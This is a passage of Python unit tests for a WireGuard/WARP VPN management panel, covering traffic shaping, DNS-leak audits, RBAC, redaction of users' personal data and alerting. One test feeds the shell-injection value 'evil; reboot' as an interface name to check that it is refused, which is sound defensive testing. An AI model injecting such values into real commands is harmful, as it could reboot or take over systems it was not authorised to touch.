            self.assertEqual(m.svc_services()["c_cisco_com"]["probe"],
                             "https://cisco.com/")
        finally:
            m.socket.getaddrinfo = orig_gai
            m.save_config = orig_save
            m.CONFIG.pop("svc_custom", None)

    def test_parse_rate_mbit(self):
        m = self.m
        self.assertEqual(m.parse_rate_mbit("20"), (20, None))
        self.assertEqual(m.parse_rate_mbit(""), (None, None))    # نامحدود
        self.assertEqual(m.parse_rate_mbit("0"), (None, None))   # ۰ = نامحدود
        self.assertIsNone(m.parse_rate_mbit("abc")[0])           # نامعتبر
        self.assertIsNotNone(m.parse_rate_mbit("abc")[1])
        self.assertIsNotNone(m.parse_rate_mbit("99999")[1])      # فراتر از سقف

    def test_shaper_classid_and_desired(self):
        m = self.m
        # نامِ ifb کوتاه‌تر از ۱۵ کاراکتر
        self.assertLessEqual(len(m.SHAPER._ifb("wg1udp")), 15)

    def test_shaper_classids_are_unique_beyond_a_slash24(self):
        """🪤 minor پیش از این آخرین بایتِ IP بود: 10.0.0.5 و 10.0.1.5 یک
        classid می‌گرفتند، `tc class add` ِ دوم «File exists» می‌داد و فیلترش
        به کلاسِ کاربرِ اول می‌رفت."""
        m = self.m
        limits = {"10.0.1.5": 7, "10.0.0.5": 5, "10.0.0.254": 9,
                  "10.0.2.254": 3}
        rows = m.SHAPER._classids(limits)
        cids = [c for _ip, _r, c in rows]
        self.assertEqual(len(set(cids)), len(limits))
        self.assertNotIn("1:" + m._DEFAULT_CLASSID, cids)
        for _ip, _r, c in rows:
            self.assertRegex(c, r"^1:[0-9a-f]+$")
        # پرش از minor ِ کلاسِ پیش‌فرض
        big = {"10.%d.%d.%d" % (i // 65536 % 256, i // 256 % 256, i % 256): 1
               for i in range(1, int(m._DEFAULT_CLASSID, 16) + 3)}
        cids = [c for _ip, _r, c in m.SHAPER._classids(big)]
        self.assertNotIn("1:" + m._DEFAULT_CLASSID.lower(), cids)
        self.assertEqual(len(set(cids)), len(big))
        # _build: هر IP یک کلاس و یک فیلتر با همان flowid، روی iface و ifb
        del m._run_calls[:]
        m.SHAPER._build("wgtest", {"10.0.0.5": 5, "10.0.1.5": 7})
        adds = [c for c in m._run_calls if c[:3] == ["tc", "class", "add"]]
        by_dev = {}
        for c in adds:
            by_dev.setdefault(c[4], []).append(c[c.index("classid") + 1])
        for dev, ids in by_dev.items():
            self.assertEqual(len(ids), len(set(ids)), (dev, ids))
        flows = [c[c.index("flowid") + 1] for c in m._run_calls
                 if c[:3] == ["tc", "filter", "add"] and "flowid" in c]
        self.assertTrue(set(flows) <= set(by_dev["wgtest"]))

    def test_shaper_and_proxy_reconcile_are_serialised(self):
        m = self.m
        seen = []
        m.SHAPER._reconcile = lambda: seen.append(m.SHAPER._lock.locked())
        m.SHAPER.reconcile()
        m.PROXY._reconcile = lambda: seen.append(m.PROXY._lock.locked())
        m.PROXY.reconcile()
        self.assertEqual(seen, [True, True])

    def test_shaper_desired_skips_ipv6_peers(self):
        m = self.m
        m.META.meta_update("wgtest", "v6", {"rate_mbit": 5})
        m.META.meta_update("wgtest", "v4", {"rate_mbit": 6})
        orig = m.peer_ip
        m.peer_ip = lambda iface, name: {"v6": "fd00::5", "v4": "10.0.0.5"}[name]
        try:
            self.assertEqual(m.SHAPER._desired(), {"wgtest": {"10.0.0.5": 6}})
        finally:
            m.peer_ip = orig

    def test_write_root_file_uses_a_unique_tmp_and_keeps_the_mode(self):
        m = self.m
        path = os.path.join(self.tmp, "rootfile.txt")
        m._write_root_file(path, "hello\n", 0o640)
        with open(path) as f:
            self.assertEqual(f.read(), "hello\n")
        self.assertEqual(stat.S_IMODE(os.stat(path).st_mode), 0o640)
        self.assertEqual([f for f in os.listdir(self.tmp)
                          if f.startswith("rootfile.txt.")], [])

    def test_path_summary_and_mos(self):
        m = self.m
        hops = [{"host": "???", "avg": 0, "jitter": 0, "loss": 100},
                {"host": "9.9.9.9", "avg": 40, "jitter": 1.0, "loss": 0},
                {"host": "1.2.3.4", "avg": 60, "jitter": 3.0, "loss": 0}]
        s = m._path_summary(hops, "1.2.3.4")
        self.assertEqual(s["rtt"], 60.0)      # از هاپِ مقصد
        self.assertEqual(s["jitter"], 3.0)
        self.assertEqual(s["loss"], 0.0)
        self.assertTrue(1.0 <= s["mos"] <= 4.5)
        # افتِ بالا → کیفیتِ کمتر
        lossy = m._path_summary(
            [{"host": "1.2.3.4", "avg": 60, "jitter": 3, "loss": 50}], "1.2.3.4")
        self.assertLess(lossy["mos"], s["mos"])

    def test_mtr_history_roundtrip_and_prev(self):
        m = self.m
        m.META.mtr_add("youtube", "awg1", "1.2.3.4", 50, 1, 0, 4.1, True, 10, "[]")
        r2 = m.META.mtr_add("youtube", "awg1", "1.2.3.4", 80, 5, 2, 3.2, True, 11, "[]")
        prev = m.META.mtr_prev("youtube", "awg1", r2)
        self.assertIsNotNone(prev)
        self.assertEqual(prev["mos"], 4.1)    # اجرای قبل از r2
        hist = m.META.mtr_history("youtube", "awg1")
        self.assertEqual(len(hist), 2)
        self.assertEqual(hist[0]["mos"], 4.1)  # قدیمی→جدید

    def test_svc_mtr_binds_iface_and_ssrf_target(self):
        m = self.m
        m.iface_meta_all = lambda: {"awg1": {}}
        m.shutil = types.SimpleNamespace(which=lambda x: "/usr/bin/" + x)
        m.META.svc_resolved_upsert("youtube", {"142.250.185.110"})
        seen = {}

        def fake_run(cmd, timeout=20):
            seen["cmd"] = cmd
            return 0, " 1  142.250.1.1  12.3 ms  11.0 ms  10.0 ms\n", ""
        m.run = fake_run
        res = m.svc_mtr("youtube", "awg1")
        self.assertTrue(res["ok"])
        self.assertEqual(res["target"], "142.250.185.110")
        self.assertEqual(res["tool"], "traceroute")
        self.assertEqual(len(res["hops"]), 1)
        # traceroute به همان اینترفیس bind شده و مقصد IP عمومی است
        self.assertEqual(seen["cmd"][0], "traceroute")
        self.assertIn("-i", seen["cmd"])
        self.assertEqual(seen["cmd"][seen["cmd"].index("-i") + 1], "awg1")
        self.assertEqual(seen["cmd"][-1], "142.250.185.110")

    def test_svc_mtr_refuses_bad_iface(self):
        m = self.m
        m.iface_meta_all = lambda: {"awg1": {}}
        m.shutil = types.SimpleNamespace(which=lambda x: "/usr/bin/" + x)
        ran = {"n": 0}

        def fake_run(cmd, timeout=20):
            ran["n"] += 1
            return 0, "{}", ""
        m.run = fake_run
        res = m.svc_mtr("youtube", "evil; reboot")
        self.assertFalse(res["ok"])
        self.assertEqual(ran["n"], 0)

    def test_svc_mtr_target_skips_private_ips(self):
        m = self.m
        # فقط IP خصوصی resolve شده → نباید هدفی برگردد (ضدِ SSRF)
        m.META.svc_resolved_upsert("x", {"10.0.0.1", "192.168.1.1"})
        m.svc_resolve_one = lambda s: set()
        self.assertIsNone(m.svc_mtr_target("x"))

    def test_svc_db_roundtrip(self):
        m = self.m
        m.META.svc_resolved_upsert("x", {"1.1.1.1", "2.2.2.2"})
        m.META.svc_resolved_upsert("x", {"2.2.2.2", "3.3.3.3"})
        summ = m.META.svc_resolved_summary()
        self.assertEqual(summ["x"]["count"], 3)  # اجتماع، بدون تکرار
        m.META.svc_probe_upsert("x", "awg1", True, 88.0, 200, "ok", "")
        m.META.svc_probe_upsert("x", "awg1", False, None, 451, "geoblock", "")
        allp = m.META.svc_probe_all()
        self.assertEqual(allp[("x", "awg1")]["verdict"], "geoblock")  # آخرین برنده
        self.assertEqual(allp[("x", "awg1")]["http_code"], 451)


class RbacTests(unittest.TestCase):
    """RBAC: کاتالوگ مجوز، نقش‌ها، وضعیت حساب و پوشش کامل PERM_MAP.
    (عمداً از PanelTestCase ارث نمی‌برد تا ۶۵ تستِ آن دوباره اجرا نشوند.)"""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _mkuser(self, name="u1", role="viewer", **kw):
        m = self.m
        u = {"username": name, "salt": "a" * 32,
             "hash": "h", "role": role, "totp": "",
             "stoken": "tok123"}
        u.update(kw)
        m.CONFIG["users"].append(u)
        return u

    # ---- ممیزیِ نشتِ DNS/IPv6 --------------------------------------------
    # قاعده‌ی مرکزی: «BIND را دور زد» و «بیرونِ تونل رفت» دو چیزِ متفاوت‌اند.
    # اولی افتِ یکپارچگی است (warn)، دومی نشتِ واقعی (bad). قاطی‌کردنشان یا
    # هشدارِ بی‌جا می‌سازد یا نشتِ واقعی را پشتِ «سبز» پنهان می‌کند.
    def test_user_ingress_from_killswitch_rules(self):
        """منبعِ اینترفیسِ کاربر باید قواعدِ کیل‌سوییچ باشد، نه user_subnets —
        آن کلید روی سرور خالی است و منطقِ متکی به آن بی‌صدا به دیدِ سرور
        می‌افتد که مسیرِ متفاوتی دارد."""
        m = self.m
        m.run = lambda cmd, **kw: (0, (
            "0:\tfrom all lookup local\n"
            "32700:\tfrom all iif wg1udp lookup main suppress_prefixlength 0\n"
            "32701:\tfrom all iif wg1udp prohibit\n"
            "32706:\tfrom all iif eth1 lookup main suppress_prefixlength 0\n"
            "32707:\tfrom all iif eth1 prohibit\n"), "")
        self.assertEqual(m.user_ingress_ifaces(), ["wg1udp", "eth1"])

    def test_connected_subnet_prefers_route_over_addr(self):
        """wg1udp آدرسِ /32 دارد؛ پیشوندِ واقعیِ کاربران فقط در مسیرِ متصل است."""
        m = self.m
        m.run = lambda cmd, **kw: (0, "192.168.188.0/24 proto kernel scope link"
                                      " src 192.168.188.1\n", "")
        self.assertEqual(m.iface_connected_subnet("wg1udp"), "192.168.188.0/24")
        self.assertEqual(m._sample_user_ip("192.168.188.0/24"), "192.168.188.11")

    def _audit_with(self, m, probe_dev, wan="eth0"):
        """dns_leak_audit را با یک لایه‌ی `run` ساختگی اجرا می‌کند."""
        def fake(cmd, **kw):
            c = " ".join(cmd)
            if c.startswith("ip route show default"):
                return 0, "default via 1.2.3.4 dev %s\n" % wan, ""
            if c.startswith("ip rule show"):
                return 0, "32701:\tfrom all iif wg1udp prohibit\n", ""
            if c.startswith("ip route show dev wg1udp"):
                return 0, "192.168.188.0/24 scope link\n", ""
            if c.startswith("ip route get"):
                return 0, "x dev %s src y\n" % probe_dev, ""
            if c.startswith("ss "):
                return 0, "UNCONN 0 0 2.2.2.2:53 0.0.0.0:*\n", ""
            if c.startswith("iptables -t nat -S"):
                return 0, ("-A PREROUTING -i wg1udp -p udp --dport 53 "
                           "-m set --match-set COMMON_DNS dst -j DNAT "
                           "--to-destination 2.2.2.2\n"), ""
            if c.startswith("ipset list"):
                return 0, "Number of entries: 9\n", ""
            if c.startswith("ipset test"):
                return 1, "", ""          # هیچ‌کدام اجباری نیست
            if c.startswith("sysctl"):
                return 0, "1\n", ""
            if c.startswith("ip -6 route"):
                return 1, "", ""
            if c.startswith("ip -6 addr"):
                return 0, "inet6 fe80::1/64 scope link\n", ""
            return 0, "", ""
        m.run = fake
        m.warp_sync_config = lambda: ({}, {}, {"resolver": "2.2.2.2"})
        return m.dns_leak_audit()

    def test_bypass_but_tunneled_is_warn_not_leak(self):
        a = self._audit_with(self.m, probe_dev="awg1")
        self.assertEqual(a["verdict"], "warn")
        self.assertTrue(all(p["tunneled"] for p in a["probes"]))
        self.assertFalse([f for f in a["findings"] if f["level"] == "bad"])

    def test_bypass_outside_tunnel_is_real_leak(self):
        a = self._audit_with(self.m, probe_dev="eth0")
        self.assertEqual(a["verdict"], "bad")
        self.assertTrue([f for f in a["findings"]
                         if f["level"] == "bad" and "نشتِ واقعی" in f["text"]])

    def test_audit_never_mutates(self):
        """ممیزی باید فقط بخوانَد — هیچ دستورِ تغییردهنده‌ای نزند."""
        m = self.m
        seen = []

        def spy(cmd, **kw):
            seen.append(" ".join(cmd))
            return 0, "", ""
        m.run = spy
        m.warp_sync_config = lambda: ({}, {}, {"resolver": "2.2.2.2"})
        m.dns_leak_audit()
        BAD = (" add ", " del ", " flush", " -A ", " -D ", " -I ",
               "replace", "restart", "sysctl -w")
        self.assertEqual([c for c in seen if any(b in c for b in BAD)], [])

    # ---- ECH: سنجه‌ی صادق + تله‌ی ECHConfig ------------------------------
    # اکستنشنِ 0xfe0d که splitter می‌شمارد با GREASEِ کروم یکی است. ۴ اوت
    # ۲۰۲۶ اندازه‌گیری شد: ۴۳GB «ECHدار» ولی صفر دامنه‌ی منتشرکننده ⇒ همه
    # GREASE. با احتسابش «کوری» ۶۷٪ خوانده می‌شد (آستانه ۲۵٪) در حالی که
    # کوریِ واقعی ۲۴٫۶٪ بود — هشدار به سیگنالِ دروغ شلیک می‌کرد.
    def _seed_split(self, m, nosni, ech):
        """ستونِ hour رشته‌ی '%Y-%m-%d %H' است نه timestamp — فیلترِ سری
        مقایسه‌ی رشته‌ای می‌کند، پس مقدارِ عددی بی‌صدا بیرون می‌افتد."""
        import sqlite3
        con = sqlite3.connect(m.DB_PATH)
        con.execute("CREATE TABLE IF NOT EXISTS warp_split_hour("
                    "hour TEXT PRIMARY KEY, ai INTEGER, direct INTEGER,"
                    "qai INTEGER, qdirect INTEGER, nosni INTEGER, ech INTEGER)")
        con.execute("INSERT OR REPLACE INTO warp_split_hour VALUES"
                    "(?,?,?,?,?,?,?)",
                    (time.strftime("%Y-%m-%d %H"), 100, 900, 0, 0, nosni, ech))
        con.commit(); con.close()

    def test_blind_excludes_ech_extension(self):
        m = self.m
        self._seed_split(m, nosni=100, ech=5000)
        ser = m.warp_split_series("24h")
        self.assertEqual(ser["total_blind"], 100)   # فقط بی‌SNI
        self.assertEqual(ser["total_ech"], 5000)    # رصدی، جدا
        # با فرمولِ قدیمی ۵۱٪ می‌شد و آستانه‌ی ۲۵٪ را می‌شکست
        self.assertEqual(ser["blind_pct"], 10)
        self.assertEqual(ser["ech_pct"], 500)

    def test_ech_publishers_flags_only_real_echconfig(self):
        m = self.m
        seen = []

        def fake_run(cmd, **kw):
            seen.append(cmd[-2])
            if cmd[-2] == "gemini.google.com":
                return 0, '1 . alpn="h2" ech=AEX+DQBB...\n', ""
            return 0, '1 . alpn="h2,h3"\n', ""     # HTTPS دارد، ech ندارد
        m.run = fake_run
        m._ECH_PROBE.update(ts=0, hits=[])
        hits = m.warp_ech_publishers(
            ["gemini.google.com", "notebooklm.google.com", "9.9.9.0/24"])
        self.assertEqual(hits, ["gemini.google.com"])
        self.assertNotIn("9.9.9.0/24", seen)        # پیشوندِ IP پرسیده نشد

    def test_ech_probe_is_cached(self):
        m = self.m
        calls = []
        m.run = lambda cmd, **kw: (calls.append(1), (0, "", ""))[1]
        m._ECH_PROBE.update(ts=0, hits=[])
        m.warp_ech_publishers(["a.google.com"])
        n = len(calls)
        m.warp_ech_publishers(["a.google.com"])     # بارِ دوم باید از کش بیاید
        self.assertEqual(len(calls), n)
        m.warp_ech_publishers(["a.google.com"], force=True)
        self.assertGreater(len(calls), n)

    # ---- گیتِ سمتِ سرورِ داده‌ی شخصیِ WARP -------------------------------
    # /api/warp/status عمداً با tun.view باز است (viewer هم داردش) ولی بارش
    # نامِ سایت‌های کاربران و نگاشتِ IP→کاربر دارد. رابط آن‌ها را پنهان
    # می‌کند؛ این تست تضمین می‌کند پنهان‌سازی فقط سمتِ کلاینت نماند.
    # 🪤 شکلِ payload باید همان شکلِ warp_status باشد: آمار و نگاشتِ
    # IP→کاربر زیرِ d["sni"] است (warp_sni_status)، نه سطحِ بالا. نسخه‌ی
    # قبلیِ این تست payload ِ تخت می‌داد و سبز می‌ماند در حالی که تابع
    # کلیدهای تو‌در‌تو را دست نمی‌زد و همه‌چیز به viewer می‌رفت.
    def _warp_stats(self):
        return {"ai_conns": 5,
                "top_sni": [["gemini.google.com", 9, 2, 1]],
                "top_sni_conns": [["notebook.google.com", 4, 90, 0]],
                "top_src": [["192.168.188.11", 1, 2, 3, 4]]}

    def _warp_payload(self):
        return {"healthy": True,
                "autodetect": {"ts": 111, "checked": 3,
                               "added": ["labs.google"],
                               "blocked": [{"sni": "x.google.com",
                                            "iran": "403", "warp": "404",
                                            "conns": 90, "bytes": 400}]},
                "sni": {"enabled": True, "healthy": True,
                        "src_labels": {"192.168.188.11": "wg1udp/abab"},
                        "stats": self._warp_stats()}}

    def test_warp_status_redacted_hides_personal_data(self):
        m = self.m
        out = m.warp_status_redacted(self._warp_payload(),
                                     m.role_perms("viewer"))
        self.assertEqual(out["sni"]["src_labels"], {})
        for k in ("top_sni", "top_sni_conns", "top_src"):
            self.assertNotIn(k, out["sni"]["stats"])
        # کشفِ خودکار هم نامِ دامنه‌های کاربران است ⇒ همان گیت
        self.assertEqual(out["autodetect"], {})
        self.assertEqual(out["sni"]["stats"]["ai_conns"], 5)   # غیرشخصی می‌ماند
        self.assertTrue(out["sni"]["healthy"])
        self.assertTrue(out["healthy"])

    def test_warp_status_redacted_handles_flat_payload_too(self):
        """سازگاریِ عقب‌رو/دفاعِ عمقی: اگر روزی آمار در سطحِ بالا هم بیاید."""
        m = self.m
        p = {"healthy": True, "src_labels": {"1.1.1.1": "x"},
             "stats": self._warp_stats()}
        out = m.warp_status_redacted(p, m.role_perms("viewer"))
        self.assertEqual(out["src_labels"], {})
        self.assertNotIn("top_sni", out["stats"])
        self.assertEqual(out["stats"]["ai_conns"], 5)

    def test_warp_status_redacted_matches_the_real_payload_shape(self):
        """گاردِ شکل: خروجیِ واقعیِ warp_status باید همان جایی داده داشته
        باشد که این تست‌ها پاک می‌کنند — وگرنه تستِ بالا دوباره بی‌اثر است."""
        m = self.m
        m._WARP_CACHE.update(ts=0, data=None)
        m.warp_sni_status = lambda: {"enabled": True, "healthy": True,
                                     "src_labels": {"10.0.0.2": "u"},
                                     "stats": self._warp_stats()}
        w = m.warp_status(force=True)
        self.assertIn("sni", w)
        self.assertIn("top_sni", w["sni"]["stats"])
        out = m.warp_status_redacted(w, m.role_perms("viewer"))
        self.assertNotIn("top_sni", out["sni"]["stats"])
        self.assertEqual(out["sni"]["src_labels"], {})

    def test_warp_status_redacted_passes_manager_through(self):
        m = self.m
        p = self._warp_payload()
        out = m.warp_status_redacted(p, m.role_perms("admin"))
        self.assertIs(out, p)
        self.assertIn("top_sni_conns", out["sni"]["stats"])
        self.assertEqual(out["autodetect"]["added"], ["labs.google"])

    def test_warp_status_carries_autodetect_for_panel(self):
        """parity با ربات: تا ۴ اوت ۲۰۲۶ فقط ربات کشفِ خودکار را نشان می‌داد
        چون این کلید اصلاً در payloadِ پنل نبود."""
        m = self.m
        m.warp_autodetect_state = lambda: {"ts": 7, "added": ["a.google.com"]}
        m._WARP_CACHE.update(ts=0, data=None)     # کش را دور بزن
        w = m.warp_status(force=True)
        self.assertEqual(w.get("autodetect", {}).get("added"), ["a.google.com"])

    def test_warp_status_redacted_does_not_mutate_cache(self):
        """warp_status کشِ ۱۰ثانیه‌ای دارد و همان شیء را برمی‌گرداند؛ حذفِ
        درجا یعنی درخواستِ viewer جدول‌ها را برای مدیرِ بعدی هم می‌بُرد."""
        m = self.m
        p = self._warp_payload()
        m.warp_status_redacted(p, m.role_perms("viewer"))
        self.assertIn("top_sni", p["sni"]["stats"])
        self.assertIn("top_sni_conns", p["sni"]["stats"])
        self.assertEqual(p["sni"]["src_labels"],
                         {"192.168.188.11": "wg1udp/abab"})
        self.assertEqual(p["autodetect"]["added"], ["labs.google"])

    def test_warp_private_stats_matches_ui_gate(self):
        """هر کلیدی که رابط پشتِ warp.manage می‌گذارد باید در فهرستِ حذف
        باشد — وگرنه فیلدِ تازه بی‌صدا از گیت رد می‌شود."""
        m = self.m
        for k in ("top_sni", "top_sni_conns", "top_src"):
            self.assertIn(k, m.WARP_PRIVATE_STATS)

    def test_normalize_perms_implies_view(self):
        m = self.m
        got = m.normalize_perms(["wg.del", "proxy.edit", "tun.toggle",
                                 "svc.edit", "bogus.perm"])
        self.assertIn("wg.view", got)
        self.assertIn("proxy.view", got)
        self.assertIn("tun.view", got)
        self.assertIn("svc.view", got)
        self.assertNotIn("bogus.perm", got)

    def test_role_perms_builtin_and_unknown(self):
        m = self.m
        self.assertEqual(m.role_perms("admin"), set(m.ALL_PERMS))
        self.assertEqual(m.role_perms("viewer"), set(m.VIEWER_PERMS))
        # نقشِ ناشناخته/حذف‌شده → هیچ دسترسی (پیش‌فرضِ امن)
        self.assertEqual(m.role_perms("ghost"), set())
        m.CONFIG["roles"] = {"op": {"perms": ["proxy.add"],
                                    "require_totp": True}}
        self.assertEqual(m.role_perms("op"), {"proxy.add", "proxy.view"})
        self.assertTrue(m.role_require_totp("op"))
        self.assertFalse(m.role_require_totp("viewer"))

    def test_user_expired_and_active(self):
        m = self.m
        u = self._mkuser()
        self.assertFalse(m.user_expired(u))          # بدون انقضا
        u["expires"] = "2099-01-01"
        self.assertFalse(m.user_expired(u))
        u["expires"] = "2020-01-01"
        self.assertTrue(m.user_expired(u))
        self.assertFalse(m.user_is_active(u))
        u["expires"] = "not-a-date"                  # قالب خراب → منقضی نیست
        self.assertFalse(m.user_expired(u))
        u["expires"] = ""
        u["active"] = False
        self.assertFalse(m.user_is_active(u))

    def test_session_cookie_rejects_disabled_or_expired(self):
        m = self.m
        u = self._mkuser("s1", role="admin")
        c = m.make_session_cookie(u)
        self.assertIsNotNone(m.verify_session_cookie(c))
        u["active"] = False
        self.assertIsNone(m.verify_session_cookie(c))
        u["active"] = True
        u["expires"] = "2020-01-01"
        self.assertIsNone(m.verify_session_cookie(c))

    def test_user_ip_ok(self):
        m = self.m
        u = self._mkuser("ip1")
        self.assertTrue(m.user_ip_ok(u, "8.8.8.8"))          # بدون محدودیت
        u["allow_ips"] = ["5.10.0.0/16", "82.99.1.7"]
        self.assertTrue(m.user_ip_ok(u, "5.10.44.3"))
        self.assertTrue(m.user_ip_ok(u, "82.99.1.7"))
        self.assertFalse(m.user_ip_ok(u, "8.8.8.8"))
        self.assertTrue(m.user_ip_ok(u, "127.0.0.1"))        # ضدِ خودقفلی

    def test_parse_panel_allow_ips(self):
        m = self.m
        ips, err = m.parse_panel_allow_ips("5.10.0.0/16, 82.99.1.7")
        self.assertIsNone(err)
        self.assertEqual(ips, ["5.10.0.0/16", "82.99.1.7"])
        ips, err = m.parse_panel_allow_ips("")
        self.assertEqual((ips, err), ([], None))
        ips, err = m.parse_panel_allow_ips("nope")
        self.assertIsNotNone(err)

    def test_count_active_admins(self):
        m = self.m
        self._mkuser("boss", role="admin")
        self._mkuser("boss2", role="admin", active=False)
        self._mkuser("v", role="viewer")
        self.assertEqual(m.count_active_admins(), 1)
        self.assertEqual(m.count_active_admins(exclude_username="boss"), 0)

    def test_user_needs_totp(self):
        m = self.m
        m.CONFIG["roles"] = {"sec": {"perms": [], "require_totp": True}}
        u = self._mkuser("t1", role="sec")
        self.assertTrue(m.user_needs_totp(u))
        u["totp"] = "SECRET"
        self.assertFalse(m.user_needs_totp(u))

    def test_perm_map_covers_every_endpoint(self):
        """هیچ endpointی نباید بدونِ نگاشتِ RBAC بماند: هر مسیرِ /api/ که در
        سورس هندل می‌شود باید یا در PERM_MAP باشد، یا سلف‌سرویس، یا زیرِ
        /api/users/ یا /api/roles/ (users.manage)."""
        m = self.m
        import re as _re
        with open(PANEL, encoding="utf-8") as f:
            src = f.read()
        paths = set(_re.findall(r'path == "(/api/[^"]+)"', src))
        self.assertGreater(len(paths), 40)  # sanity: همه پیدا شده‌اند
        H = m.Handler
        for p in sorted(paths):
            covered = (p in H.PERM_MAP or p in H.SELF_PATHS
                       or p.startswith("/api/users/")
                       or p.startswith("/api/roles/"))
            self.assertTrue(covered, "endpoint بدون نگاشت RBAC: %s" % p)
        # و برعکس: نگاشت به endpoint ناموجود اشاره نکند
        for p in H.PERM_MAP:
            self.assertIn(p, paths, "PERM_MAP به مسیر ناموجود: %s" % p)
        # همه‌ی مجوزهای PERM_MAP در کاتالوگ باشند
        for perm in H.PERM_MAP.values():
            self.assertIn(perm, m.ALL_PERMS)

    def test_required_perm(self):
        H = self.m.Handler
        self.assertEqual(H.required_perm("/api/users/add"), "users.manage")
        self.assertEqual(H.required_perm("/api/roles/save"), "users.manage")
        self.assertEqual(H.required_perm("/api/peer/delete"), "wg.del")
        self.assertIsNone(H.required_perm("/api/stats"))


class AlertTests(unittest.TestCase):
    """سامانه‌ی هشدارِ تلگرام: config، لبه‌یابی، رویدادها."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_alert_cfg_defaults_and_merge(self):
        m = self.m
        c = m.alert_cfg()
        self.assertFalse(c["enabled"])
        self.assertEqual(set(c["events"]), set(m.ALERT_EVENT_KEYS))
        m.CONFIG["alerts"] = {"enabled": True, "cpu_pct": 75,
                              "events": {"tunnel": False}}
        c = m.alert_cfg()
        self.assertTrue(c["enabled"])
        self.assertEqual(c["cpu_pct"], 75)
        self.assertFalse(c["events"]["tunnel"])
        self.assertTrue(c["events"]["login"])   # کلیدِ نداده = پیش‌فرض true

    def test_edge_honours_the_event_category(self):
        """🪤 edge مستقیم emit می‌زد، پس کلیدهای events.tunnel/events.swap
        بی‌اثر بودند؛ با category باید از فیلترِ دسته رد شود."""
        m = self.m
        m.CONFIG["alerts"] = {"enabled": True, "events": {"tunnel": False}}
        sent = []
        m.ALERTS.emit = lambda t, html=False: sent.append(t)
        m.ALERTS.state.clear()
        m.ALERTS.edge("t", True, "x", category="tunnel")
        m.ALERTS.edge("t", False, "tunnel-down", category="tunnel")
        self.assertEqual(sent, [])                    # دسته خاموش
        m.ALERTS.edge("s", True, "x", category="swap")
        m.ALERTS.edge("s", False, "swap-ok", category="swap")
        self.assertEqual(sent, ["swap-ok"])           # دسته‌ی روشن (پیش‌فرض)
        m.ALERTS.edge("u", True, "x")
        m.ALERTS.edge("u", False, "plain")
        self.assertEqual(sent, ["swap-ok", "plain"])  # بدونِ دسته: مثلِ قبل

    def test_tunnel_and_swap_checks_respect_their_toggles(self):
        m = self.m
        m.CONFIG["alerts"] = {"enabled": True,
                              "events": {"tunnel": False, "swap": False}}
        sent = []
        m.ALERTS.emit = lambda t, html=False: sent.append(t)
        m.ALERTS.state.clear()
        mon = m.AlertMonitor()
        m.TUNNELS.data = {"wg21": {"systemd": "failed", "endpoint": ""}}
        mon._check_tunnels()
        m.TUNNELS.data = {"wg21": {"systemd": "active", "endpoint": ""}}
        mon._check_tunnels()
        self.assertEqual(sent, [])
        # ولی ردِ ممیزیِ گذر همچنان نوشته می‌شود (نشانگرِ روی گراف)
        rows = m.META.audit_list(category="tunnel", limit=5)
        self.assertTrue(any(r["action"] == "tun.monitor.up" for r in rows))

    def test_expiry_alert_covers_wireguard_and_proxy_once_a_day(self):
        """🪤 پیش از این فقط پروکسی، هر ۶ ساعت، و بی‌حافظه بینِ ری‌استارت‌ها."""
        m = self.m
        m.EXPIRY_STATE = os.path.join(self.tmp, "alert-expiry.last")
        m.CONFIG["alerts"] = {"enabled": True, "expiry_days": 3}
        from datetime import datetime as _dt, timedelta as _td
        soon = (_dt.now() + _td(days=2)).strftime("%Y-%m-%d")
        far = (_dt.now() + _td(days=30)).strftime("%Y-%m-%d")
        m.META.meta_update("wgtest", "alice", {"expires": soon})
        m.META.meta_update("wgtest", "bob", {"expires": far})
        m.META.proxy_user_upsert("carol", {"pass_hash": "x", "rate_kbit": 0,
                                           "quota_gb": 0, "expires": soon,
                                           "enabled": 1, "note": ""})
        events = []
        m.ALERTS.event = lambda key, text: events.append((key, text))
        mon = m.AlertMonitor()
        hits = mon.expiring_accounts()
        self.assertEqual([(k, n) for k, n, _e in hits],
                         [("wg", "alice@wgtest"), ("px", "carol")])
        mon._check_expiry()
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0][0], "expiry")
        self.assertIn("alice@wgtest", events[0][1])
        self.assertIn("carol", events[0][1])
        self.assertNotIn("bob", events[0][1])
        # همان روز، دوباره (و بعد از «ری‌استارت» = نمونه‌ی تازه) → بی‌صدا
        mon._check_expiry()
        m.AlertMonitor()._check_expiry()
        self.assertEqual(len(events), 1)
        with open(m.EXPIRY_STATE) as f:
            self.assertEqual(f.read().strip(), _dt.now().strftime("%Y-%m-%d"))
        # روزِ بعد → دوباره
        mon._last_expiry_day = "1999-01-01"
        mon._check_expiry()
        self.assertEqual(len(events), 2)
        # دسته‌ی خاموش → هیچ
        m.CONFIG["alerts"]["events"] = {"expiry": False}
        mon._last_expiry_day = "1999-01-01"
        mon._check_expiry()
        self.assertEqual(len(events), 2)

    def test_alert_edge_only_on_change(self):
        m = self.m
        m.CONFIG["alerts"] = {"enabled": True}
        sent = []
        m.ALERTS.emit = lambda t: sent.append(t)
        m.ALERTS.state.clear()
        m.ALERTS.edge("k", True, "up")     # اولین‌بار (prev=None) → بی‌صدا
        self.assertEqual(sent, [])
        m.ALERTS.edge("k", True, "up")     # بدونِ تغییر → بی‌صدا
        self.assertEqual(sent, [])
        m.ALERTS.edge("k", False, "down")  # تغییر → صدا
        self.assertEqual(sent, ["down"])

    def test_resource_alert_reads_the_current_metrics(self):
        """🪤 SYSMON.snapshot() = {"cur": {...}, "extra": {...}}. پیش از این
        snap.get("cpu") روی پوشش خوانده می‌شد → همیشه None → هشدارِ
        CPU/RAM/DISK هرگز ارسال نمی‌شد."""
        m = self.m
        m.CONFIG["alerts"] = {"enabled": True, "cpu_pct": 80,
                              "sustain_min": 1}
        cur = {"cpu": 95.0, "ram": 10.0, "disk": 10.0}
        m.SYSMON = types.SimpleNamespace(
            snapshot=lambda: {"cur": dict(cur), "extra": {}})
        events = []
        m.ALERTS.event = lambda key, text: events.append((key, text))
        m.ALERTS.state.clear()
        mon = m.AlertMonitor()
        need = max(1, int(60 / mon.INTERVAL))
        for _ in range(need):
            mon._check_resources()
        self.assertEqual(len(events), 1, events)
        self.assertEqual(events[0][0], "resource")
